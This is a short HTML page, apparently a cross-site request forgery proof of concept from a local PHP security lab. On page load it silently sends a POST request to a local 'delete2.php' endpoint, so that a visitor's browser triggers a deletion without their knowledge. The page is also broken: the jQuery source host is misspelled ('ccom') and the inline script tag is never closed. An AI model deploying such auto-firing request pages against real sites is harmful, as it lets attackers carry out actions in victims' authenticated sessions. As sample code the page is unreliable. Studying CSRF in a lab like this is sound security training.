<html>
<head>
  <title></title>

<script src="https://ajax.googleapis.ccom/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
</head>

<body>

  <script type="text/javascript">
  $(document).ready(function(){
    $.ajax({
      url : "http://localhost/phpsecurity/csrf/delete2.php",
      method : "POST"
    })
  })
</body>
</html>
